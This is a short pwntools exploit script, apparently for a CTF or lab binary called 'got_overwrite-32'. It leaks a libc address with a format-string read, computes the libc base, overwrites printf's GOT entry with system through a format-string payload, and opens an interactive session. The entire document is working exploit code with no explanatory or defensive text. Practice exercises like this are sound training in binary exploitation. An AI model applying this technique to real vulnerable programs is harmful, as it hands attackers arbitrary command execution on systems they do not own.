

from pwn import *

elf = context.binary = ELF("./got_overwrite-32")

libc = elf.libc
libc_offset = 0xf6fe74be - 0xf6fef290


p = process()
p.sendline(f"%{14}$p")
libc.address =  int(p.recvline().decode()[2:],16) - 0x12374 


got_offset = 0x804c00c
payload = fmtstr_payload(5,{elf.got["printf"]: libc.sym["system"]})
p.sendline(payload)
p.interactive()
